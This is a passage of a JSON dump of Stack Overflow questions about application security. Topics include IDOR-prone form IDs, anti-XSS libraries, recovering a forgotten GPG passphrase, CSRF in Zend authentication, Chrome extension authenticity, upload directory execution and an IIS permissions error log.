look.</p>\n"},{"tags":["html","asp.net-mvc","security"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":62,"score":4,"question_id":12604810,"title":"How do I prevent my HTML from being exploitable while avoiding GUIDs?","body":"<p>I've recently inherited a ASP.NET MVC 4 code base. One problem I noted was the use of some database ids (ints) in the urls as well in html form submissions. The code in its present state is exploitable through both URL tinkering and creating custom HTML posts with different numbers.</p>\n\n<p>Now while I can easily fix the URL problems by using session state or additional auth checks i'm less sure about the database ids that get embedded into the HTML that the site spits out (i.e. I give them a drop down to fill). When the ids come back in a post how can I be sure I put them there as valid options?\nWhat is considered \"best practice\" in terms of addressing this problem? </p>\n\n<p>While I appreciate I could just \"GUID it up\" I'm hesitant to do so because I find them a pain in the ass to work with when debugging databases. </p>\n\n<p>Do I have a choice here? Must I GUID to prevent easy guessing of ids or is there some kind of DRY mechanism I can use to validate the usage of ids as they come back into the site?</p>\n\n<p>UPDATE: A commenter asked about the exploits I'm expecting. Lets say I spit out a HTML form with a drop down list of all the locations one can import \"treasure\" from. The id of the locations that the user owns are 1,2 and 3, these are provided in the HTML. But the user examines the html, fiddles with it and decides to put together a POST with the id of 4 selected. 4 is not his location, its someone else's.</p>\n"},{"tags":["php","security","input","xss"],"answer_count":7,"favorite_count":3,"up_vote_count":8,"down_vote_count":1,"view_count":1420,"score":7,"question_id":3974221,"title":"Is there a definitive anti-XSS library for PHP?","body":"<p>I already know how XSS works, but finding out all the many different ways to inject malicious input is not an option.</p>\n\n<p>I saw a couple libraries out there, but most of them are very incomplete, ineficient, or GPL licensed (when will you guys learn that GPL is not good to share little libraries! Use MIT)</p>\n"},{"tags":["security","gpg","gnupg","gpgme"],"answer_count":2,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":4217,"score":7,"question_id":856912,"title":"Best way to soft brute-force your own GPG/PGP passphrase?","body":"<p>I created a nice long passphrase, used it a few times, then forgot it ;) The twist is, I know the general theme and probably almost all of the characters. The perfectionist in me doesn't want to revoke the key or anything like that (and I think I need the passphrase to revoke it anyway, right?). I feel I should be able to have a good go at this by brute-forcing the likely layouts/characters that I've got wrong/mis-typed. I wrote a C program to produce such combinations. Unfortunately I don't have the code to hand (I'll go with the \"it's not relevant\" excuse for now ;). I also came across some <a href=\"http://www.vanheusden.com/nasty/\" rel=\"nofollow\">code</a> on the web using GPGME to do exactly this as a proof-of-concept. It had the comment \"this could easily be 100 times faster\". Problem is, profiling the code shows the bottleneck to be the GPGME call itself. Is this expected, or is it a limitation of GPGME that could be solved using the full library or a dedicated implementation?</p>\n\n<p>How would you go about doing this? Obviously this method is infeasible for any decent <em>unknown</em> passphrase, but I think the key is that I know <em>what</em> I typed without knowing the exact formatting of <em>how</em> I typed it - should be feasible, no?</p>\n"},{"tags":["android","security","wifi","android-wifi"],"answer_count":3,"favorite_count":3,"up_vote_count":3,"down_vote_count":0,"view_count":1480,"score":3,"question_id":6866153,"title":"android: Determine security type of wifi networks in range (without connecting to them)","body":"<p>I can enumerate all wifi networks in range (using startScan + SCAN_RESULTS_AVAILABLE_ACTION + getScanResults) and get their SSID and BSSID values, but I can't figure out how to determine the security type of each network.</p>\n\n<p>In my main object:</p>\n\n<pre><code>    IntentFilter intentFilter = new IntentFilter();\n    intentFilter.addAction(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION);\n    registerReceiver(scanReceiver, intentFilter);\n    ((WifiManager)getSystemService(Context.WIFI_SERVICE)).startScan();\n</code></pre>\n\n<p>In my scanReceiver object:</p>\n\n<pre><code>public void onReceive(Context c, Intent intent) {\n    if (WifiManager.SCAN_RESULTS_AVAILABLE_ACTION.equals(intent.getAction())){\n        mainObject.scanComplete();\n    }\n}\n</code></pre>\n\n<p>And again in my main object:</p>\n\n<pre><code>public void scanComplete()\n{\n    List&lt;ScanResult&gt; networkList = ((WifiManager)getSystemService.(Context.WIFI_SERVICE)).getScanResults();\n    for (ScanResult network : networkList)\n    {\n        &lt;do stuff&gt;\n    }\n}\n</code></pre>\n\n<p>The code works insofar that scanComplete eventually gets called, and I can successfully enumerate all nearby wifi networks and get their SSID and BSSID, but I can't figure out how to determine their security type.</p>\n\n<p>Is there a way to do this?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["security","zend-auth"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12593259,"title":"Does basic Zend Authentication leave any gaping security holes like CSRF?","body":"<p>I have a security related concern that may be tied to a Zend::Auth example in the David Powers book PHP training from the source.  I am using Zend Community edition 1.11.11 as an includes library and not as the MVC framework.  While this is installed an working on my site:</p>\n\n<pre><code>&lt;?php\n\n$failed = FALSE;\n\nif ($_POST) {\n\nif (empty($_POST['username']) || empty($_POST['password'])) {\n\n$failed = TRUE;\n\n} else {\n\nrequire_once('library.php');\n\n// check the user's credentials\n\ntry {\n\n  $auth = Zend_Auth::getInstance();\n\n  $adapter = new Zend_Auth_Adapter_DbTable($dbRead, 'user', 'login', 'user_pass', 'sha1(?)');\n\n  $adapter-&gt;setIdentity($_POST['username']);\n\n  $adapter-&gt;setCredential($_POST['password']);\n\n  $result = $auth-&gt;authenticate($adapter);\n\n  if ($result-&gt;isValid()) {\n\n    $storage = $auth-&gt;getStorage();\n\n    $storage-&gt;write($adapter-&gt;getResultRowObject(array(\n\n      'ID', 'login',  'user_first', 'user_last', 'user_role')));\n\n    header('Location: /member/index.php');\n\n    exit;\n\n  } else {\n\n    $failed = TRUE;\n\n  }\n\n} catch (Exception $e) {\n\n  echo $e-&gt;getMessage();\n\n}\n\n}\n\n}\n\nif (isset($_GET['logout'])) {\n\n require_once('library.php');\n\ntry {\n\n $auth = Zend_Auth::getInstance();\n\n$auth-&gt;clearIdentity();\n\n} catch (Exception $e) {\n\necho $e-&gt;getMessage();\n\n}\n</code></pre>\n\n<p>}</p>\n\n<p>Apparently, there is very limited protection against Cross Site Request Forgery, where the resulting SessionID could be easily hijacked?   I have an observation from a client that this authentication is not up to snuff. I'm trying:  </p>\n\n<pre><code>    $namespace = new Zend_Session_Namespace('Zend_Auth');\n    $namespace-&gt;setExpirationSeconds(3600);\n</code></pre>\n\n<p>(but this is not particularly desirable for the site usage)</p>\n\n<p>To boil it down: </p>\n\n<ol>\n<li><p>Is there a Zend configuration file or some know best practices that might increase the security/authentication beyond this basic example?  Ie How to secure the session against a changing user IP, and invoking some other session handling techniques to reduce XSS or CRSF?  </p></li>\n<li><p>Will \"salting\" passwords won't help with this?</p></li>\n</ol>\n\n<p>Any help for this newbie to Zend is appreciated.  </p>\n\n<p>EDIT:  I see this <a href=\"http://stackoverflow.com/questions/2453341/how-does-hash-element-make-a-secure-login-on-zend-framework\">question</a> answers the CRSF part by suggesting use of the Zend Form Hash Element.  Is this the best practice?</p>\n"},{"tags":["php","javascript","jquery","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":213,"score":0,"question_id":4927309,"title":"How to call a javascript file during PHP file execution. ","body":"<p>I'm dealing with passwords so security is critical.  </p>\n\n<p>Here's the flow...</p>\n\n<p>I want to periodically update a user's screen with data I am fetching.  </p>\n\n<p>I would use a jquery function and call a smaller php file upon success, but I don't want to pass the user's password in a POST function.  </p>\n\n<p>I am assuming that if I call a jquery function from within the PHP function periodically, that would eliminate the issue of passing a password using the post function to php.  </p>\n\n<p>Reason I'm passing a password is that I'm using IMAP and have to use a user's password in order to retrieve emails.  </p>\n\n<p>Current flow (non secure)\n1.)  Pass username and password using javascript into PHP function using jquery AJAX and POST variable.  My assumption is that this is not secure.  </p>\n\n<p>What's the secure solution?  </p>\n"},{"tags":["java","web-services","security","jax-ws"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":12602848,"title":"XWS-Security Framework and SignatureFilter","body":"<p>I have been using XWS-Security Framework, and having one question due to issue which occurs.</p>\n\n<p>So, I have a dynamic web project, and implementation of  javax.security.auth.callback.CallbackHandler interface.</p>\n\n<p>How can I prevent loading of the handler programmatically?</p>\n\n<p>Thank you in advance!</p>\n\n<p>Best regards,\nJurica Krizanic</p>\n"},{"tags":["security","https","web-security"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":90,"score":1,"question_id":12410549,"title":"How secure is https?","body":"<p>I have recently been looking into HTTPS, and just how secure it is.</p>\n\n<p>I went to an https site which had a valid certificate and entered my username and password. Using <strong>Fiddler</strong>, I decrypted the requests which appeared after clicking the submit button, and there was my username and password in plain text in a string containing key-value pairs (this wasn't the querystring, it was the post values).</p>\n\n<p>Can anyone enlighten me as to why HTTPS is said to be secure when it is this easy for me to get the username and password using an external application? I mean it was pretty much instant decryption, and surely a hacker could use an application to find out what requests you're making and decrypt them, can't they?</p>\n"},{"tags":[".net","security","asp.net-membership"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12598492,"title":"Decrypt asp.net membership password from a windows forms application","body":"<p>I have an unusual setup. I have on one machine a web application with standard membership and encrypted password. On another machine i have a windows application where i must use the same user credentials as provided in the web application. I need to be able to retrieve the encrypted password from the database and then decrypt it on the windows app to be able to log in using it. (the windows app will ask the web site via a WCF service for the encrypted password matching a particular username).</p>\n\n<p>All the articles i find tell me to derive from the Membership provider, but i dont have a membership provider in my windows app. And importing it is not an option.</p>\n\n<p>Is there any way i can decrypt the password from the information i have available (knowing the machinekey etc.) ? All within my Window Forms application?</p>\n"},{"tags":["ios","security","data-storage","uipasteboard"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":173,"score":0,"question_id":10907849,"title":"UIPasteboard security","body":"<p>I need to store information on application that always need to be read when open application. But I don't want user copy/dump/or edit it. So the question is : \"Is UIPasteboard can solve this problem?\" is it security? and if not, what else is suitable to use.</p>\n\n<p>Thank you very much.</p>\n\n<p>Edit: Is there have other solution that can solve \"delete and reinstall application?\"</p>\n"},{"tags":["ios","security","authentication","ssl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":322,"score":0,"question_id":11160002,"title":"AFNetworking SSL","body":"<p>I am very new to authentication/ssl especially combined with ios. My question is, if I am sending a username and password to lets say <code>https://server.com/login.php</code> do I need to hash my passwords in the iOS client or can I post the text of password then hash them before they are stored in the DB?</p>\n"},{"tags":["security","authentication","client-server","hacking"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":28,"score":1,"question_id":12597876,"title":"Techniques to prevent non-genuine clients from interacting with a server","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/3774128/how-to-ensure-a-net-application-is-genuine\">How to ensure a .Net application is genuine?</a>  </p>\n</blockquote>\n\n\n\n<p>I can't seem to find any good articles on this. In a client/server environment, is there any way to ensure that the clients connecting have not been tampered with?</p>\n\n<p>The only two things I can think of doing are:</p>\n\n<ol>\n<li><p>include a secret key in the genuine client, that is used in\nauthentication, to prevent complete rewrites of the client</p></li>\n<li><p>monitor the clients for behaviours that I believe deviate from\nwhat the genuine clients do</p></li>\n</ol>\n\n<p>[1] does not prevent hacking, only rewrites. Plus presumably you can eventually find the key by looking through the bytecode?</p>\n\n<p>[2] can be quite very tricky and sometimes subjective</p>\n\n<p>Are there known techniques beyond the two above?</p>\n\n<p>Thanks</p>\n"},{"tags":["java","security","jsp","web-applications","session-cookies"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":12598919,"title":"session not shared between two server","body":"<p>i  have big trouble with my application that web-application(jsp,java,servlet)  landed between  two server cause \nthere is load-sharing between server but unfortunately session not maintaining  between server now i am checking checking after login if session is there than ok otherwise i am taking all credential from url (visible encoded url with same key if somebody remember url then big mess  ) obviously its not secure at all ,SO how we can resolve this problame at application level please guide me....... </p>\n"},{"tags":["security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":4,"score":0,"question_id":12598947,"title":"how to have own control over security of asp.net web application?","body":"<p>I am creating an asp.net web application.\nI don't want to use asp.net configuration system for securing my application so that i can have my control over that security.\nSo,is there another way for securing my web application?\nPlease Suggest.\nThanks in advance.</p>\n"},{"tags":["c#","security",".net-4.0"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12597442,"title":"Net 4 security settings for signed assemblies","body":"<p>I have an application that has been working fine until now using strong name assemblies under Net 3.5.</p>\n\n<p>Recently I have moved the project to Net 4.0, and I have also signed the assemblies with a code signing certificate. When I start the app on a machine that has Windows 7 installed, the program will not start (it throws an exception before executing the first line of code).</p>\n\n<p>To try and fine out what the problem was I installed the program, still using Net 4.0, but without signing the assemblies with the code signing certificate; and the program works okay.</p>\n\n<p>So, my question is: Under Net 4, how can I grant FullTrust to assemblies that have been signed with our Code Signing Certificate?</p>\n\n<p>Thanks,\nMartin.</p>\n"},{"tags":["osx","cocoa","security","service-management"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12539044,"title":"Correct usage of SMJobBless for single action?","body":"<p>I'm running a little tool to run an action that has a start and end (it's an installer). I don't want to leave things lying around the filesystem (or the launchd config) after the installer runs. If it ever runs again it can re-blessed etc.</p>\n\n<p>Is this the right approach to take for jobs that will only run once?</p>\n\n<p>(also if you're knowledgable, take a look at <a href=\"http://stackoverflow.com/questions/11557026/smjobremove-succeeds-but-plist-and-helper-tool-not-deleted\">11557026</a>, it needs an answer!)</p>\n"},{"tags":["security","warnings","infopath"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3592,"score":1,"question_id":3637302,"title":"InfoPath -how to disable Microsoft Office InfoPath Security Notice - \"Microsoft has identified a potential security concern\"","body":"<p>I have an InfoPath form template as a content type in a form library on SharePoint.  The form has several data connections which on submit, save it back to a specific form library on SharePoint depending on how one field is filled out.  </p>\n\n<p>After I added an additional data connection to receive information from SQL to a drop down control, when the form is opened (new or existing), the following Microsoft security message appears \"Microsoft Office InfoPath Security Notice - Microsoft has identified a potential security concern...\".  This warning appears EVERY time. </p>\n\n<p>I have added these connections as IE Internet Options trusted sites.  In the InfoPath form itself, in Tools>Trust Center, I have unchecked (privacy options) \"check Microsoft Office documents that are from or link to suspicious Web site in InfoPaths Trust Center\". </p>\n\n<p>None of these actions are solving the problem.  Is there a way to turn this security warning off?</p>\n"},{"tags":["spring","security","dojo"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12493334,"title":"Session gets expired before time out","body":"<pre><code>I'm using spring  3.0.7, spring security 3.1 with dojo 1.6.\n</code></pre>\n\n<p>I handled ajax request authentication with the following code by  overriding <code>onAuthenticationSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication)</code> in <code>SavedRequestAwareAuthenticationSuccessHandler</code> handler by following code</p>\n\n<pre><code>if (\"XMLHttpRequest\".equals(request.getHeader(\"X-Requested-With\"))) {           \n    this.setRedirectStrategy(new RedirectStrategy() {\n        @Override\n        public void sendRedirect(HttpServletRequest request,HttpServletResponse response,String s) throws IOException {\n            //do nothing, no redirect to make it working with extjs, dojo and jQuery\n            logger.debug(\"My sendRedirect \" + request.getHeader(\"X-Requested-With\"));\n        }\n    });\n        Writer out = responseWrapper.getWriter();\n\n        String  requestUrl = request.getContextPath().concat(\"/successUrl\");\n\n         out.write(\"{status:'Ok',targetUrl:'\" + requestUrl + \"'}\");\n         out.flush();\n         out.close();\n    }\n    else\n    {\n        this.setRedirectStrategy(new DefaultRedirectStrategy() );\n        super.onAuthenticationSuccess(request, response, authentication);\n    }\n</code></pre>\n\n<p>and session expiration  is being handled by overriding <code>commence(HttpServletRequest request, HttpServletResponse response, AuthenticationException authException)</code> in <code>LoginUrlAuthenticationEntryPoint</code> by the following code </p>\n\n<pre><code>if (\"XMLHttpRequest\".equals(request.getHeader(\"X-Requested-With\"))) {\n    logger.info(\"Request Header \"+request.getHeader(\"X-Requested-With\"));\n\n    Writer out = response.getWriter();\n\n    out.write(\"{status:'601',message:'\"+authException.getMessage()+\"'}\");\n         out.flush();\n         out.close();\n         logger.info(\"Ajax parameter: \" + request.getHeader(\"X-Requested-With\"));\n}else{\n    super.commence(request, response, authException);         \n}\n</code></pre>\n\n<p>Everything is fine regarding session except it randomly logs out before session time out and it redirects to login page.</p>\n\n<p>i check status on client side if it is 601 then i call /logout url to go to login page.</p>\n\n<p>Can anyone help me out whether it is due to spring security bug or custom implementation of above code.</p>\n"},{"tags":["security","authentication","iis7","authorization","objectdisposedexception"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":431,"score":0,"question_id":4927880,"title":"IIS7 integrated mode closing token between requests","body":"<p>We are migrating to IIS7 integrated mode and have come across an issue. We authenticate using WindowsAuthentication but then store a reference to the WindowsPrincipal so that on future requests we can authorize as needed against AD. In IIS 7 Integrated mode, the token is being closed (between requests) so that when we try to run IsInRole it generates a disposed exception. Is there a way to cache this token or change our use of WindowsPrincipal so that we don't need to make successive AD requests to get it for each authorization request?</p>\n\n<p>Here is the exception being thrown from WindowsPrincipal.IsInRole(\"\")\n- System.ObjectDisposedException: {\"Safe handle has been closed\"} </p>\n\n<p>Thanks.</p>\n"},{"tags":["javascript","security","google-chrome","google-chrome-extension"],"answer_count":2,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":200,"score":7,"question_id":12460297,"title":"How to check the authenticity of a Chrome extension?","body":"<h3>The Context:</h3>\n\n<ul>\n<li>You have a web server which has to provide an exclusive content only if your client has your specific Chrome extension installed.</li>\n<li>You have two possibilities to provide the Chrome extension package:\n<ol>\n<li>From the Chrome Web Store</li>\n<li>From your own server</li>\n</ol></li>\n</ul>\n\n<h3>The problem:</h3>\n\n<ul>\n<li>There is a plethora of solutions allowing to know that a Chrome extension is installed:\n<ol>\n<li>Inserting an element when a web page is loaded by using <a href=\"http://developer.chrome.com/extensions/content_scripts.html\">Content Scripts</a>.</li>\n<li>Sending specific headers to the server by using <a href=\"http://developer.chrome.com/extensions/webRequest.html\">Web Requests</a>.</li>\n<li>Etc.</li>\n</ol></li>\n<li>But there seems to be no solution to check if the Chrome extension which is interacting with your web page is genuine. </li>\n<li>Indeed, as the source code of the Chrome extension can be viewed and copied by anyone who want to, <strong>there seems to be no way to know if the current Chrome extension interacting with your web page is the one you have published</strong> or a cloned version (and maybe somewhat altered) by another person.</li>\n<li>It seems that you are only able to know that some Chrome extension is interacting with your web page in an \"expected way\" but you cannot verify its authenticity.</li>\n</ul>\n\n<h3>The solution?</h3>\n\n<ul>\n<li>One solution may consist in using information contained in the Chrome extension package and which cannot be altered or copied by anyone else:\n<ol>\n<li>Sending the Chrome extension's ID to the server? But how?\n<ul>\n<li>The ID has to be sent by you and your JavaScript code and there seems to be no way to do it with an \"internal\" Chrome function.</li>\n<li>So if someone else just send the same ID to your server (some kind of Chrome extension's ID spoofing) then your server will consider his Chrome extension as a genuine one!</li>\n</ul></li>\n<li>Using the private key which served when you packaged the application? But how?\n<ul>\n<li>There seems to be no way to access or use in any way this key programmatically!</li>\n</ul></li>\n</ol></li>\n<li>One other solution my consist in using <a href=\"http://developer.chrome.com/extensions/npapi.html\">NPAPI Plugins</a> and embed authentication methods like GPG, etc. But this solution is not desirable mostly because of the big \"Warning\" section of its <a href=\"http://developer.chrome.com/extensions/npapi.html\">API's doc</a>.</li>\n<li><em><strong>Is there any other solution?</em></strong></li>\n</ul>\n\n<h3>Notes</h3>\n\n<p>This question attempts to raise a real security problem in the Chrome extension's API: How to check the authenticity of your Chrome extension when it comes to interact with your services.\nIf there are any missing possibilities, or any misunderstandings please feel free to ask me in comments.</p>\n"},{"tags":["c#","asp.net","security","rsa","securid"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":1082,"score":1,"question_id":4882214,"title":"RSA SecurID development with C#","body":"<p>I'm trying to develop using asp and c#. Is there any .Net support for implementing RSA SecurID Authentication?</p>\n"},{"tags":["php","security","upload","centos"],"answer_count":4,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":791,"score":4,"question_id":2618908,"title":"How to prevent a specific directory from running Php, Html, and Javascript languages?","body":"<p>Let's say i have an image uploader script, i want to prevent the upload directory from executing Php or even html by only showing it as plain text, i've seen this trick in many websites but i don't know how they do it.</p>\n\n<p>Briefly, if i upload <code>evil.php</code> to that directory, and i try to access it i will only see a plain text source , No html or php is executed. ( but i still want the images to appear normally ofcourse)</p>\n\n<p>I know i can do like that by <code>header(\"content-type:text/plain\");</code> but that's will not be helpful, because what i want, is to set the <code>content-type:text/plain</code> automatically by the server for every thing outputed from the upload directory except images.</p>\n\n<p>Note: i'm running php 5.3.2/Cent OS and the latest cPanel.</p>\n\n<p>Thanks</p>\n"},{"tags":["asp.net","security","iis","iis7","aspnet-compiler"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2815,"score":0,"question_id":5284355,"title":"Why does my ASP.NET 4.0 web service fail with a compliation error with NetworkService but succeed with LocalSystem","body":"<p>I started getting server-side compliation errors indicating that the identity of my web service's application pool could not access files within a temporary ASP.NET folder.  If I change the identity of the application pool from NetworkService to LocalSystem, the problem goes away.  I can't see any issue with the security settings on the folder and I reran aspnet_regiis -i to no effect.</p>\n\n<p>The complete exception as it appears in the application error log is included below, but the gist of it is:</p>\n\n<pre><code>HttpCompileException\nerror CS0016: Could not write to output file 'c:\\Windows\\Microsoft.NET\\\nFramework\\v4.0.30319\\Temporary ASP.NET Files\\kswsextensionservicesweb\\f2efe503\\\n31c03187\\App_global.asax.4gcxry4d.dll' -- 'Access is denied. '\n</code></pre>\n\n<p>Can anyone explain why?  What's strange is that it had been working.  Something changed, but I can't figure out what.</p>\n\n<pre><code>Log Name:      Application\nSource:        ASP.NET 4.0.30319.0\nDate:          3/12/2011 12:41:21 PM\nEvent ID:      1310\nTask Category: Web Event\nLevel:         Warning\nKeywords:      Classic\nUser:          N/A\nComputer:      NYDMTRAIN01.kayescholer.com\nDescription:\nEvent code: 3007 \nEvent message: A compilation error has occurred. \nEvent time: 3/12/2011 12:41:21 PM \nEvent time (UTC): 3/12/2011 5:41:21 PM \nEvent ID: bc285ecdc00941d28070725f55ea24f1 \nEvent sequence: 3 \nEvent occurrence: 1 \nEvent detail code: 0 \n\nApplication information: \n    Application domain: /LM/W3SVC/1/ROOT/KSWSExtensionServicesWeb-2-129444252812003152 \n    Trust level: Full \n    Application Virtual Path: /KSWSExtensionServicesWeb \n    Application Path: C:\\inetpub\\wwwroot\\KSWSExtensionServicesWeb\\ \n    Machine name: NYDMTRAIN01 \n\nProcess information: \n    Process ID: 3988 \n    Process name: w3wp.exe \n    Account name: NT AUTHORITY\\NETWORK SERVICE \n\nException information: \n    Exception type: HttpCompileException \n    Exception message: (0): error CS0016: Could not write to output file 'c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Temporary ASP.NET Files\\kswsextensionservicesweb\\f2efe503\\31c03187\\App_global.asax.4gcxry4d.dll' -- 'Access is denied. '\n   at System.Web.Compilation.AssemblyBuilder.Compile()\n   at System.Web.Compilation.BuildProvidersCompiler.PerformBuild()\n   at System.Web.Compilation.ApplicationBuildProvider.GetGlobalAsaxBuildResult(Boolean isPrecompiledApp)\n   at System.Web.Compilation.BuildManager.CompileGlobalAsax()\n   at System.Web.Compilation.BuildManager.EnsureTopLevelFilesCompiled()\n   at System.Web.Compilation.BuildManager.CallAppInitializeMethod()\n   at System.Web.Hosting.HostingEnvironment.Initialize(ApplicationManager appManager, IApplicationHost appHost, IConfigMapPathFactory configMapPathFactory, HostingEnvironmentParameters hostingParameters, PolicyLevel policyLevel, Exception appDomainCreationException)\n\n\n\nRequest information: \n    Request URL: http://nydmtrain01/KSWSExtensionServicesWeb/Services/KSWSDocumentHistoryService.svc \n    Request path: /KSWSExtensionServicesWeb/Services/KSWSDocumentHistoryService.svc \n    User host address: 172.25.43.171 \n    User:  \n    Is authenticated: False \n    Authentication Type:  \n    Thread account name: NT AUTHORITY\\NETWORK SERVICE \n\nThread information: \n    Thread ID: 6 \n    Thread account name: NT AUTHORITY\\NETWORK SERVICE \n    Is impersonating: False \n    Stack trace:    at System.Web.Compilation.AssemblyBuilder.Compile()\n   at System.Web.Compilation.BuildProvidersCompiler.PerformBuild()\n   at System.Web.Compilation.ApplicationBuildProvider.GetGlobalAsaxBuildResult(Boolean isPrecompiledApp)\n   at System.Web.Compilation.BuildManager.CompileGlobalAsax()\n   at System.Web.Compilation.BuildManager.EnsureTopLevelFilesCompiled()\n   at System.Web.Compilation.BuildManager.CallAppInitializeMethod()\n   at System.Web.Hosting.HostingEnvironment.Initialize(ApplicationManager appManager, IApplicationHost appHost, IConfigMapPathFactory configMapPathFactory, HostingEnvironmentParameters hostingParameters, PolicyLevel policyLevel, Exception appDomainCreationException)\n\n\nCustom event details: \n\nEvent Xml:\n&lt;Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"&gt;\n  &lt;System&gt;\n    &lt;Provider Name=\"ASP.NET 4.0.30319.0\" /&gt;\n    &lt;EventID Qualifiers=\"32768\"&gt;1310&lt;/EventID&gt;\n    &lt;Level&gt;3&lt;/Level&gt;\n    &lt;Task&gt;3&lt;/Task&gt;\n    &lt;Keywords&gt;0x80000000000000&lt;/Keywords&gt;\n    &lt;TimeCreated SystemTime=\"2011-03-12T17:41:21.000Z\" /&gt;\n    &lt;EventRecordID&gt;127544&lt;/EventRecordID&gt;\n    &lt;Channel&gt;Application&lt;/Channel&gt;\n    &lt;Computer&gt;NYDMTRAIN01.kayescholer.com&lt;/Computer&gt;\n    &lt;Security /&gt;\n  &lt;/System&gt;\n  &lt;EventData&gt;\n    &lt;Data&gt;3007&lt;/Data&gt;\n    &lt;Data&gt;A compilation error has occurred.&lt;/Data&gt;\n    &lt;Data&gt;3/12/2011 12:41:21 PM&lt;/Data&gt;\n    &lt;Data&gt;3/12/2011 5:41:21 PM&lt;/Data&gt;\n    &lt;Data&gt;bc285ecdc00941d28070725f55ea24f1&lt;/Data&gt;\n    &lt;Data&gt;3&lt;/Data&gt;\n    &lt;Data&gt;1&lt;/Data&gt;\n    &lt;Data&gt;0&lt;/Data&gt;\n    &lt;Data&gt;/LM/W3SVC/1/ROOT/KSWSExtensionServicesWeb-2-129444252812003152&lt;/Data&gt;\n    &lt;Data&gt;Full&lt;/Data&gt;\n    &lt;Data&gt;/KSWSExtensionServicesWeb&lt;/Data&gt;\n    &lt;Data&gt;C:\\inetpub\\wwwroot\\KSWSExtensionServicesWeb\\&lt;/Data&gt;\n    &lt;Data&gt;NYDMTRAIN01&lt;/Data&gt;\n    &lt;Data&gt;\n    &lt;/Data&gt;\n    &lt;Data&gt;3988&lt;/Data&gt;\n    &lt;Data&gt;w3wp.exe&lt;/Data&gt;\n    &lt;Data&gt;NT AUTHORITY\\NETWORK SERVICE&lt;/Data&gt;\n    &lt;Data&gt;HttpCompileException&lt;/Data&gt;\n    &lt;Data&gt;(0): error CS0016: Could not write to output file 'c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Temporary ASP.NET Files\\kswsextensionservicesweb\\f2efe503\\31c03187\\App_global.asax.4gcxry4d.dll' -- 'Access is denied. '\n   at System.Web.Compilation.AssemblyBuilder.Compile()\n   at System.Web.Compilation.BuildProvidersCompiler.PerformBuild()\n   at System.Web.Compilation.ApplicationBuildProvider.GetGlobalAsaxBuildResult(Boolean isPrecompiledApp)\n   at System.Web.Compilation.BuildManager.CompileGlobalAsax()\n   at System.Web.Compilation.BuildManager.EnsureTopLevelFilesCompiled()\n   at System.Web.Compilation.BuildManager.CallAppInitializeMethod()\n   at System.Web.Hosting.HostingEnvironment.Initialize(ApplicationManager appManager, IApplicationHost appHost, IConfigMapPathFactory configMapPathFactory, HostingEnvironmentParameters hostingParameters, PolicyLevel policyLevel, Exception appDomainCreationException)\n\n&lt;/Data&gt;\n    &lt;Data&gt;http://nydmtrain01/KSWSExtensionServicesWeb/Services/KSWSDocumentHistoryService.svc&lt;/Data&gt;\n    &lt;Data&gt;/KSWSExtensionServicesWeb/Services/KSWSDocumentHistoryService.svc&lt;/Data&gt;\n    &lt;Data&gt;172.25.43.171&lt;/Data&gt;\n    &lt;Data&gt;\n    &lt;/Data&gt;\n    &lt;Data&gt;False&lt;/Data&gt;\n    &lt;Data&gt;\n    &lt;/Data&gt;\n    &lt;Data&gt;NT AUTHORITY\\NETWORK SERVICE&lt;/Data&gt;\n    &lt;Data&gt;6&lt;/Data&gt;\n    &lt;Data&gt;NT AUTHORITY\\NETWORK SERVICE&lt;/Data&gt;\n    &lt;Data&gt;False&lt;/Data&gt;\n    &lt;Data&gt;   at System.Web.Compilation.AssemblyBuilder.Compile()\n   at System.Web.Compilation.BuildProvidersCompiler.PerformBuild()\n   at System.Web.Compilation.ApplicationBuildProvider.GetGlobalAsaxBuildResult(Boolean isPrecompiledApp)\n   at System.Web.Compilation.BuildManager.CompileGlobalAsax()\n   at System.Web.Compilation.BuildManager.EnsureTopLevelFilesCompiled()\n   at System.Web.Compilation.BuildManager.CallAppInitializeMethod()\n   at System.Web.Hosting.HostingEnvironment.Initialize(ApplicationManager appManager, IApplicationHost appHost, IConfigMapPathFactory configMapPathFactory, HostingEnvironmentParameters hostingParameters, PolicyLevel policyLevel, Exception appDomainCreationException)\n&lt;/Data&gt;\n  